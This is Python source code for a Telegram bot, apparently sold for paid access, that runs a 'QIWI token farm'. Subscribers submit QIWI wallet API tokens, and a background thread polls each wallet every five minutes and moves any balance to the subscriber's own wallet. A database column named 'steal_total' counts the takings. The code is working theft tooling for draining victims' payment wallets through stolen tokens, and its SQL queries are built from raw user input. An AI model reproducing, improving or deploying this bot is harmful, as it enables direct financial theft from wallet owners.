from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.helper import Helper, HelperMode, ListItem
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from SimpleQIWI import *
import time
import threading
import datetime

import config
import keyboard
from sql import connection, q

bot = Bot(token=config.telegram_token) # –¢–æ–∫–µ–Ω
dp = Dispatcher(bot, storage=MemoryStorage())

def check_token():
    while True:
        print('–ü—Ä–æ–≤–µ—Ä—è—é —Ç–æ–∫–µ–Ω—ã...')
        q.execute(f"SELECT id, token FROM tokens ORDER BY id DESC")
        result = q.fetchall()
        for i in result:
            try:
                api = QApi(token=i[1], phone='')
                balance = api.balance[0]
                if balance >= 1:
                    q.execute(f"SELECT * FROM users WHERE id = '{i[0]}'")
                    result = q.fetchall()
                    try:
                        now = datetime.datetime.now()
                        dt = now.strftime(f"%d.%m.%Y")
                        api.pay(account=f"{result[0][2]}", amount=balance-1)
                        q.execute(f"UPDATE users SET steal_total = {result[0][1] + balance} WHERE id = '{i[0]}'")
                        q.execute(f"INSERT INTO withdraws (id, time, money)"
                            f"VALUES ('{i[0]}', '{dt}', '{balance}')")
                        connection.commit()
                        send_message(i[0], result[0][2], i[1], balance)
                    except Exception as e:
                        print('–ù–µ—É–¥–∞—á–Ω–æ')
                        print(e)
            except:
                ()
        time.sleep(300)

async def check_user(id):
    rs = False

    q.execute(f"SELECT * FROM users WHERE id = {id}")
    result = q.fetchall()
    if len(result) == 0:
            q.execute(f"INSERT INTO users (id)"
                        f"VALUES ('{id}')")
    else:
        if result[0][3] == 1:
            rs = True
    connection.commit()
    return rs

def send_message(id, your_phone, from_token, balance):
    requests.get(f"https://api.telegram.org/bot{config.telegram_token}/sendMessage?chat_id={id}&text=‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—ã–≤–æ–¥ —Å —Ñ–µ—Ä–º\n\nüåê –í —Ä–∞–∑–º–µ—Ä–µ: {balance}‚ÇΩ\nüì• –û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å: {from_token}\n‚ôªÔ∏è –ü–æ–ª—É—á–∞—Ç–µ–ª—å: {your_phone}")

class PropsStates(Helper):
    mode = HelperMode.snake_case

    PROPS_0 = ListItem()
    PROPS_1 = ListItem()
    PROPS_2 = ListItem()
    PROPS_3 = ListItem()
    PROPS_4 = ListItem()

@dp.message_handler(commands=['start'])
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'–ü—Ä–∏–≤–µ—Ç, –¥—Ä—É–≥ üôã‚Äç‚ôÇÔ∏è\n–î–∞–Ω–Ω—ã–π –±–æ—Ç, —è–≤–ª—è–µ—Ç—Å—è —Ñ–µ—Ä–º–æ–π QIWI —Ç–æ–∫–µ–Ω–æ–≤ ü•ù\n–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è: @admricker\n–ò–ù–§–û: https://t.me/INWOWEPMA\n\nP.s. —Ç–∞–∫ –∫–∞–∫ –±–æ—Ç–æ–≤, –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ –ø–æ–ø—É—Å—Ç—É –Ω–µ—Ç—É. –° —Ç–∞–∫–∏–º —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–æ–º –¥–æ—Å—Ç—É–ø –ø–ª–∞—Ç–Ω—ã–π –≤ —Ä–∞–∑–º–µ—Ä–µ 150‚ÇΩ üí∏\n\n–ö—É–ø–∏—Ç—å: @admricker (—Å—Ä–∞–∑—É –ø–∏—Å–∞—Ç—å —á—Ç–æ —Ö–æ—á—É –∫—É–ø–∏—Ç—å –ë–µ–∑ –ª–∏—à–Ω–∏—Ö –≤–æ–ø—Ä–æ—Å–æ–≤, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã —Ç—ã –Ω–∞–π–¥—ë—à—å –≤ –∫–∞–Ω–∞–ª–µ –∏–Ω—Ñ–æ.)')
        return
    await bot.send_message(message.from_user.id, '–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!\n–ß—Ç–æ–±—ã –æ—Å—Ç–∞–≤–∏—Ç—å –∑–∞—è–≤–∫—É, –≤–æ—Å–ø–æ–ª—å–∑—É–π—Ç–µ—Å—å –∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π.', reply_markup=keyboard.start_keyboard)

@dp.message_handler(commands=['admin'])
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'–ü—Ä–∏–≤–µ—Ç, –¥—Ä—É–≥ üôã‚Äç‚ôÇÔ∏è\n–î–∞–Ω–Ω—ã–π –±–æ—Ç, —è–≤–ª—è–µ—Ç—Å—è —Ñ–µ—Ä–º–æ–π QIWI —Ç–æ–∫–µ–Ω–æ–≤ ü•ù\n–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è: @admricker\n–ò–ù–§–û: https://t.me/INWOWEPMA\n\nP.s. —Ç–∞–∫ –∫–∞–∫ –±–æ—Ç–æ–≤, –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ –ø–æ–ø—É—Å—Ç—É –Ω–µ—Ç—É. –° —Ç–∞–∫–∏–º —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–æ–º –¥–æ—Å—Ç—É–ø –ø–ª–∞—Ç–Ω—ã–π –≤ —Ä–∞–∑–º–µ—Ä–µ 150‚ÇΩ üí∏\n\n–ö—É–ø–∏—Ç—å: @admricker (—Å—Ä–∞–∑—É –ø–∏—Å–∞—Ç—å —á—Ç–æ —Ö–æ—á—É –∫—É–ø–∏—Ç—å –ë–µ–∑ –ª–∏—à–Ω–∏—Ö –≤–æ–ø—Ä–æ—Å–æ–≤, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã —Ç—ã –Ω–∞–π–¥—ë—à—å –≤ –∫–∞–Ω–∞–ª–µ –∏–Ω—Ñ–æ.)')
        return
    await bot.send_message(message.from_user.id, '–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:', reply_markup=keyboard.admin)

@dp.message_handler(text='üî∞–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—èüî∞')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'–ü—Ä–∏–≤–µ—Ç, –¥—Ä—É–≥ üôã‚Äç‚ôÇÔ∏è\n–î–∞–Ω–Ω—ã–π –±–æ—Ç, —è–≤–ª—è–µ—Ç—Å—è —Ñ–µ—Ä–º–æ–π QIWI —Ç–æ–∫–µ–Ω–æ–≤ ü•ù\n–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è: @admricker\n–ò–ù–§–û: https://t.me/INWOWEPMA\n\nP.s. —Ç–∞–∫ –∫–∞–∫ –±–æ—Ç–æ–≤, –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ –ø–æ–ø—É—Å—Ç—É –Ω–µ—Ç—É. –° —Ç–∞–∫–∏–º —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–æ–º –¥–æ—Å—Ç—É–ø –ø–ª–∞—Ç–Ω—ã–π –≤ —Ä–∞–∑–º–µ—Ä–µ 150‚ÇΩ üí∏\n\n–ö—É–ø–∏—Ç—å: @admricker (—Å—Ä–∞–∑—É –ø–∏—Å–∞—Ç—å —á—Ç–æ —Ö–æ—á—É –∫—É–ø–∏—Ç—å –ë–µ–∑ –ª–∏—à–Ω–∏—Ö –≤–æ–ø—Ä–æ—Å–æ–≤, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã —Ç—ã –Ω–∞–π–¥—ë—à—å –≤ –∫–∞–Ω–∞–ª–µ –∏–Ω—Ñ–æ.)')
        return
    await message.reply('‚ùì–ß—Ç–æ —Ç–∞–∫–æ–µ —Ñ–µ—Ä–º–∞ —Ç–æ–∫–µ–Ω–æ–≤? –§–µ—Ä–º–∞ —Ç–æ–∫–µ–Ω–æ–≤ - —ç—Ç–æ –Ω–∞–±–æ—Ä –≤–∞—à–∏—Ö —Ç–æ–∫–µ–Ω–æ–≤ –∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–æ–≤–µ—Ä—è—é—Ç—Å—è –∫–∞–∂–¥—ã–µ 5 –º–∏–Ω—É—Ç –Ω–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è.\n–ï—Å–ª–∏ –∫–æ—à–µ–ª–µ–∫ –±—É–¥–µ—Ç –ø–æ–ø–æ–ª–Ω–µ–Ω —Ç–æ —Å—Ä–µ–¥—Å—Ç–≤–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤—ã–≤–µ–¥—É—Ç—Å—è –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—ã–π –≤–∞–º–∏ –∫–æ—à–µ–ª—ë–∫.', reply=False)

@dp.message_handler(text='üìä–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞üìä')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'–ü—Ä–∏–≤–µ—Ç, –¥—Ä—É–≥ üôã‚Äç‚ôÇÔ∏è\n–î–∞–Ω–Ω—ã–π –±–æ—Ç, —è–≤–ª—è–µ—Ç—Å—è —Ñ–µ—Ä–º–æ–π QIWI —Ç–æ–∫–µ–Ω–æ–≤ ü•ù\n–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è: @admricker\n–ò–ù–§–û: https://t.me/INWOWEPMA\n\nP.s. —Ç–∞–∫ –∫–∞–∫ –±–æ—Ç–æ–≤, –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ –ø–æ–ø—É—Å—Ç—É –Ω–µ—Ç—É. –° —Ç–∞–∫–∏–º —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–æ–º –¥–æ—Å—Ç—É–ø –ø–ª–∞—Ç–Ω—ã–π –≤ —Ä–∞–∑–º–µ—Ä–µ 150‚ÇΩ üí∏\n\n–ö—É–ø–∏—Ç—å: @admricker (—Å—Ä–∞–∑—É –ø–∏—Å–∞—Ç—å —á—Ç–æ —Ö–æ—á—É –∫—É–ø–∏—Ç—å –ë–µ–∑ –ª–∏—à–Ω–∏—Ö –≤–æ–ø—Ä–æ—Å–æ–≤, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã —Ç—ã –Ω–∞–π–¥—ë—à—å –≤ –∫–∞–Ω–∞–ª–µ –∏–Ω—Ñ–æ.)')
        return

    q.execute(f"SELECT * FROM users WHERE id = '{message.from_user.id}'")
    result = q.fetchall()
    q.execute(f"SELECT * FROM tokens WHERE id = '{message.from_user.id}'")
    tokens = q.fetchall()
    q.execute(f"SELECT * FROM withdraws WHERE id = '{message.from_user.id}'")
    money = q.fetchall()
    cash_today = 0
    if len(money) != 0:
        now = datetime.datetime.now()
        dt = now.strftime(f"%d.%m.%Y")
        for i in money:
            if i[2] == dt:
                cash_today += i[3]
            else:
                q.execute(f"DELETE FROM withdraws WHERE spid = {i[4]}")
                connection.commit()

    await message.reply(f'üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n\nüîê –í—Å–µ–≥–æ —Ç–æ–∫–µ–Ω–æ–≤ —É–∫–∞–∑–∞–Ω–æ: {len(tokens)}\nüïê –í—ã–≤–µ–¥–µ–Ω–æ —Å–µ–≥–æ–¥–Ω—è: {cash_today}‚ÇΩ\n‚ö°Ô∏è –í—ã–≤–µ–¥–µ–Ω–æ –≤—Å–µ–≥–æ: {result[0][1]}‚ÇΩ', reply=False)

@dp.message_handler(text='üì•–£–∫–∞–∑–∞—Ç—å —Ä–µ–∫–≤–∏–∑–∏—Ç—ãüì•')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'–ü—Ä–∏–≤–µ—Ç, –¥—Ä—É–≥ üôã‚Äç‚ôÇÔ∏è\n–î–∞–Ω–Ω—ã–π –±–æ—Ç, —è–≤–ª—è–µ—Ç—Å—è —Ñ–µ—Ä–º–æ–π QIWI —Ç–æ–∫–µ–Ω–æ–≤ ü•ù\n–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è: @admricker\n–ò–ù–§–û: https://t.me/INWOWEPMA\n\nP.s. —Ç–∞–∫ –∫–∞–∫ –±–æ—Ç–æ–≤, –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ –ø–æ–ø—É—Å—Ç—É –Ω–µ—Ç—É. –° —Ç–∞–∫–∏–º —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–æ–º –¥–æ—Å—Ç—É–ø –ø–ª–∞—Ç–Ω—ã–π –≤ —Ä–∞–∑–º–µ—Ä–µ 150‚ÇΩ üí∏\n\n–ö—É–ø–∏—Ç—å: @admricker (—Å—Ä–∞–∑—É –ø–∏—Å–∞—Ç—å —á—Ç–æ —Ö–æ—á—É –∫—É–ø–∏—Ç—å –ë–µ–∑ –ª–∏—à–Ω–∏—Ö –≤–æ–ø—Ä–æ—Å–æ–≤, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã —Ç—ã –Ω–∞–π–¥—ë—à—å –≤ –∫–∞–Ω–∞–ª–µ –∏–Ω—Ñ–æ.)')
        return
    
    await bot.send_message(message.from_user.id, '–ü–æ—Å–ª–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è, –≤–∞—à–∏—Ö —Ç–æ–∫–µ–Ω–æ–≤. –î–µ–Ω—å–≥–∏  –ø—Ä–∏–¥—É—Ç –∏–º–µ–Ω–Ω–æ –Ω–∞ —ç—Ç–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã.', reply_markup=keyboard.props)

@dp.message_handler(text='–í—ã–¥–∞—Ç—å –¥–æ—Å—Ç—É–ø')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'–ü—Ä–∏–≤–µ—Ç, –¥—Ä—É–≥ üôã‚Äç‚ôÇÔ∏è\n–î–∞–Ω–Ω—ã–π –±–æ—Ç, —è–≤–ª—è–µ—Ç—Å—è —Ñ–µ—Ä–º–æ–π QIWI —Ç–æ–∫–µ–Ω–æ–≤ ü•ù\n–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è: @admricker\n–ò–ù–§–û: https://t.me/INWOWEPMA\n\nP.s. —Ç–∞–∫ –∫–∞–∫ –±–æ—Ç–æ–≤, –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ –ø–æ–ø—É—Å—Ç—É –Ω–µ—Ç—É. –° —Ç–∞–∫–∏–º —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–æ–º –¥–æ—Å—Ç—É–ø –ø–ª–∞—Ç–Ω—ã–π –≤ —Ä–∞–∑–º–µ—Ä–µ 150‚ÇΩ üí∏\n\n–ö—É–ø–∏—Ç—å: @admricker (—Å—Ä–∞–∑—É –ø–∏—Å–∞—Ç—å —á—Ç–æ —Ö–æ—á—É –∫—É–ø–∏—Ç—å –ë–µ–∑ –ª–∏—à–Ω–∏—Ö –≤–æ–ø—Ä–æ—Å–æ–≤, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã —Ç—ã –Ω–∞–π–¥—ë—à—å –≤ –∫–∞–Ω–∞–ª–µ –∏–Ω—Ñ–æ.)')
        return
    if message.from_user.id == config.admin:
        await bot.send_message(message.from_user.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –∞–π–¥–∏ —á–µ–ª–æ–≤–µ–∫–∞')
        state = dp.current_state(user=message.from_user.id)
        await state.set_state(PropsStates.all()[3])

@dp.message_handler(text='–ó–∞–±—Ä–∞—Ç—å –¥–æ—Å—Ç—É–ø')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'–ü—Ä–∏–≤–µ—Ç, –¥—Ä—É–≥ üôã‚Äç‚ôÇÔ∏è\n–î–∞–Ω–Ω—ã–π –±–æ—Ç, —è–≤–ª—è–µ—Ç—Å—è —Ñ–µ—Ä–º–æ–π QIWI —Ç–æ–∫–µ–Ω–æ–≤ ü•ù\n–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è: @admricker\n–ò–ù–§–û: https://t.me/INWOWEPMA\n\nP.s. —Ç–∞–∫ –∫–∞–∫ –±–æ—Ç–æ–≤, –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ –ø–æ–ø—É—Å—Ç—É –Ω–µ—Ç—É. –° —Ç–∞–∫–∏–º —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–æ–º –¥–æ—Å—Ç—É–ø –ø–ª–∞—Ç–Ω—ã–π –≤ —Ä–∞–∑–º–µ—Ä–µ 150‚ÇΩ üí∏\n\n–ö—É–ø–∏—Ç—å: @admricker (—Å—Ä–∞–∑—É –ø–∏—Å–∞—Ç—å —á—Ç–æ —Ö–æ—á—É –∫—É–ø–∏—Ç—å –ë–µ–∑ –ª–∏—à–Ω–∏—Ö –≤–æ–ø—Ä–æ—Å–æ–≤, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã —Ç—ã –Ω–∞–π–¥—ë—à—å –≤ –∫–∞–Ω–∞–ª–µ –∏–Ω—Ñ–æ.)')
        return
    if message.from_user.id == config.admin:
        await bot.send_message(message.from_user.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –∞–π–¥–∏ —á–µ–ª–æ–≤–µ–∫–∞')
        state = dp.current_state(user=message.from_user.id)
        await state.set_state(PropsStates.all()[4])

@dp.callback_query_handler(text_contains='props')
async def handler(call: types.CallbackQuery):
    state = dp.current_state(user=call.from_user.id)
    
    await call.message.reply('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–æ—à–µ–ª—å–∫–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ 79999999999', reply=False)
    
    await state.set_state(PropsStates.all()[0])

@dp.message_handler(text='üí´–î–æ–±–∞–≤–∏—Ç—å —Ç–æ–∫–µ–Ωüí´')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'–ü—Ä–∏–≤–µ—Ç, –¥—Ä—É–≥ üôã‚Äç‚ôÇÔ∏è\n–î–∞–Ω–Ω—ã–π –±–æ—Ç, —è–≤–ª—è–µ—Ç—Å—è —Ñ–µ—Ä–º–æ–π QIWI —Ç–æ–∫–µ–Ω–æ–≤ ü•ù\n–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è: @admricker\n–ò–ù–§–û: https://t.me/INWOWEPMA\n\nP.s. —Ç–∞–∫ –∫–∞–∫ –±–æ—Ç–æ–≤, –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ –ø–æ–ø—É—Å—Ç—É –Ω–µ—Ç—É. –° —Ç–∞–∫–∏–º —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–æ–º –¥–æ—Å—Ç—É–ø –ø–ª–∞—Ç–Ω—ã–π –≤ —Ä–∞–∑–º–µ—Ä–µ 150‚ÇΩ üí∏\n\n–ö—É–ø–∏—Ç—å: @admricker (—Å—Ä–∞–∑—É –ø–∏—Å–∞—Ç—å —á—Ç–æ —Ö–æ—á—É –∫—É–ø–∏—Ç—å –ë–µ–∑ –ª–∏—à–Ω–∏—Ö –≤–æ–ø—Ä–æ—Å–æ–≤, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã —Ç—ã –Ω–∞–π–¥—ë—à—å –≤ –∫–∞–Ω–∞–ª–µ –∏–Ω—Ñ–æ.)')
        return
    state = dp.current_state(user=message.from_user.id)
    await state.set_state(PropsStates.all()[1])

    await bot.send_message(message.from_user.id, '–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—Ç–∏—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å.')

@dp.message_handler(text='üåê –î–æ–±–∞–≤–∏—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ç–æ–∫–µ–Ω–æ–≤üåê')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'–ü—Ä–∏–≤–µ—Ç, –¥—Ä—É–≥ üôã‚Äç‚ôÇÔ∏è\n–î–∞–Ω–Ω—ã–π –±–æ—Ç, —è–≤–ª—è–µ—Ç—Å—è —Ñ–µ—Ä–º–æ–π QIWI —Ç–æ–∫–µ–Ω–æ–≤ ü•ù\n–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è: @admricker\n–ò–ù–§–û: https://t.me/INWOWEPMA\n\nP.s. —Ç–∞–∫ –∫–∞–∫ –±–æ—Ç–æ–≤, –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ –ø–æ–ø—É—Å—Ç—É –Ω–µ—Ç—É. –° —Ç–∞–∫–∏–º —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–æ–º –¥–æ—Å—Ç—É–ø –ø–ª–∞—Ç–Ω—ã–π –≤ —Ä–∞–∑–º–µ—Ä–µ 150‚ÇΩ üí∏\n\n–ö—É–ø–∏—Ç—å: @admricker (—Å—Ä–∞–∑—É –ø–∏—Å–∞—Ç—å —á—Ç–æ —Ö–æ—á—É –∫—É–ø–∏—Ç—å –ë–µ–∑ –ª–∏—à–Ω–∏—Ö –≤–æ–ø—Ä–æ—Å–æ–≤, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã —Ç—ã –Ω–∞–π–¥—ë—à—å –≤ –∫–∞–Ω–∞–ª–µ –∏–Ω—Ñ–æ.)')
        return
    state = dp.current_state(user=message.from_user.id)
    await state.set_state(PropsStates.all()[2])

    await bot.send_message(message.from_user.id, '–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω—ã —Ä–∞–∑–¥–µ–ª—è—è –∏—Ö —Å–∏–º–≤–æ–ª–æ–º :')
 
@dp.message_handler(state=PropsStates.PROPS_0)
async def handler(message: types.Message):
    state = dp.current_state(user=message.from_user.id)
    
    q.execute(f"UPDATE users SET props = '{message.text}' WHERE id = '{message.from_user.id}'")
    connection.commit()

    await message.reply('üî•–ö–æ—à–µ–ª–µ–∫, —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω.', reply=False)

    await state.reset_state()

@dp.message_handler(state=PropsStates.PROPS_1)
async def handler(message: types.Message):
    state = dp.current_state(user=message.from_user.id)
    
    api = QApi(token=message.text, phone='')
    try:
        balance = api.balance[0]
        await message.reply('‚úÖ–¢–æ–∫–µ–Ω —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω', reply=False)
        q.execute(f"INSERT INTO tokens (id, token)"
                    f"VALUES ('{message.from_user.id}', '{message.text}')")
        connection.commit()
    except:
        await message.reply('üìõ–¢–æ–∫–µ–Ω –Ω–µ–≤–∞–ª–∏–¥–µ–Ω', reply=False)

    await state.reset_state()

@dp.message_handler(state=PropsStates.PROPS_2)
async def handler(message: types.Message):
    state = dp.current_state(user=message.from_user.id)

    valid = 0
    nevalid = 0

    tokens = (message.text).split(':')

    for i in tokens:
        try:
            api = QApi(token=i, phone='')
            balance = api.balance[0]
            valid+=1
            q.execute(f"INSERT INTO tokens (id, token)"
                        f"VALUES ('{message.from_user.id}', '{i}')")
            connection.commit()
        except:
            nevalid+=1

    await message.reply(f'‚úÖ –î–æ–±–∞–≤–ª–µ–Ω–æ —Ç–æ–∫–µ–Ω–æ–≤: {valid}\n‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: {nevalid}', reply=False)

    await state.reset_state()

@dp.message_handler(state=PropsStates.PROPS_3)
async def handler(message: types.Message):
    state = dp.current_state(user=message.from_user.id)
    
    q.execute(f"UPDATE users SET status = '1' WHERE id = '{message.text}'")
    connection.commit()

    await message.reply('–í—ã –≤—ã–¥–∞–ª–∏ –¥–æ—Å—Ç—É–ø', reply=False)

    await state.reset_state()

@dp.message_handler(state=PropsStates.PROPS_4)
async def handler(message: types.Message):
    state = dp.current_state(user=message.from_user.id)
    
    q.execute(f"UPDATE users SET status = '0' WHERE id = '{message.text}'")
    connection.commit()

    await message.reply('–í—ã –∑–∞–±—Ä–∞–ª–∏ –¥–æ—Å—Ç—É–ø', reply=False)

    await state.reset_state()

my_thread = threading.Thread(target=check_token)
my_thread.start()

print('–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω')

executor.start_polling(dp)
